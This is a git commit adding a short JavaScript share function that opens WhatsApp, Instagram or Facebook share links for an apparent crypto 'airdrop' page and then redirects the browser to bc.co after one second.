dea88f6afb97b343a430778e17c193c0cd523466
instagram <117260878+haafizhaafizhaafiz@users.noreply.github.com>
2024-04-17 21:07:40 +0530

    Add files via upload

---
+++ sec.js
@@ -0,0 +1,26 @@
+function share(platform) {
+    var url = 'https://bcgamee.github.io/BCD-AIRDROP/';
+
+    switch(platform) {
+        case 'whatsapp':
+            url = 'https://wa.me/?text=' + encodeURIComponent(url);
+            break;
+        case 'instagram':
+            url = 'https://www.instagram.com/?url=' + encodeURIComponent(url);
+            break;
+        case 'facebook':
+            url = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(url);
+            break;
+        default:
+            break;
+    }
+
+    // Open the sharing link
+    var sharingWindow = window.open(url, '_blank');
+
+    // Wait for a short delay (you can adjust this value)
+    setTimeout(function() {
+        // Redirect to https://bc.co
+        window.location.href = 'https://bc.co';
+    }, 1000); // Delay in milliseconds (e.g., 1000 milliseconds = 1 second)
+}
